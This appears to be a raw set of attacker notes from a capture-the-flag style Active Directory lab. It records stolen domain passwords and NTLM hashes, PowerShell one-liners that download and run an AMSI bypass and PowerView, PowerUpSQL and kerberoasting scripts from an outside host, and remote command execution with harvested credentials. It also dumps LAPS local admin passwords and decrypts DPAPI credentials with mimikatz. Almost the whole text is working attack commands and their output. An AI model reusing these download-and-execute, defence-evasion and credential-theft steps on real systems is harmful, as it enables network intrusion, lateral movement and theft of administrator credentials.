RLAB\AHope : Summer2022
RLAB\NGodfrey : zaq123$%^&*()_+
http://10.10.15.131/shell.hta

iex(iwr 10.10.15.131/amsi.txt -usebasicparsing);iex(iwr 10.10.15.131/PowerView.ps1 -usebasicparsing)
iex(iwr 10.10.15.131/amsi.txt -usebasicparsing);iex(iwr 10.10.15.131/PowerUpSQL.ps1 -usebasicparsing)
iex(iwr 10.10.15.131/kt.ps1);iex(iwr 10.10.15.131/kpc.ps1)

$secpassword = convertto-securestring "zaq123$%^&*()_+" -asplaintext -force
$cred = new-object system.management.automation.pscredential('RLAB\ngodfrey', $secpassword)
invoke-command -computername ws05.rastalabs.local -credential $cred -scriptblock {ipconfig}
invoke-command -session $sess -scriptblock {

ngodfrey_adm : J5KCwKruINyCJBKd1dZU
b
$secpassword = convertto-securestring "J5KCwKruINyCJBKd1dZU" -asplaintext -force;$cred = new-object system.management.automation.pscredential('RLAB\ngodfrey_adm', $secpassword)
Get-DomainObject -Identity ws01,ws02,ws03,ws04,ws05,ws06 -credential $cred|select name,ms-mcs-admpwd
WS01 mtU1l18l        
WS02 bPhQ2DQN                
WS03 iZkiX2A7            
WS04 5oPoIKGF                
WS05 UbX0W660            
WS06 bWWHN5Sv 

$secpassword = convertto-securestring "0S86gmbr" -asplaintext -force
$cred = new-object system.management.automation.pscredential('ws01\administrator', $secpassword)
invoke-command -computername ws01 -credential $cred -scriptblock {ipconfig}

epugh 326457b72c3f136d80d99bdbb935d109 Sarah2017
epugh_adm IReallyH8LongPasswords!
tquinn 74b0ecaa5aafed9d630b5d71ca7fdaaa

rweston_da 3ff61fa259deee15e4042159d7b832fa

dpapi::cred /in:c:\users\epugh\appdata\local\microsoft\credentials\936A68B5AC87C545C4A22D1AF264C8E9 /masterkey:40fc84e4d4f44f01c8d4fb8dccc8da37bbada94ecb374e813c46b03e0cd35fd4d285b5826a411fc6d3cf382d4f3aa6010ea3cae8a8a11fd4b375908e6ca17067

$secpassword = convertto-securestring "Sarah2017" -asplaintext -force;$cred = new-object system.management.automation.pscredential('RLAB\epugh', $secpassword)

$secpassword = convertto-securestring "IReallyH8LongPasswords!" -asplaintext -force;$cred = new-object system.management.automation.pscredential('RLAB\epugh_adm', $secpassword)

Get-ChildItem -Recurse -File | where { Select-String -Path $_ -List -Pattern "RASTA{" }
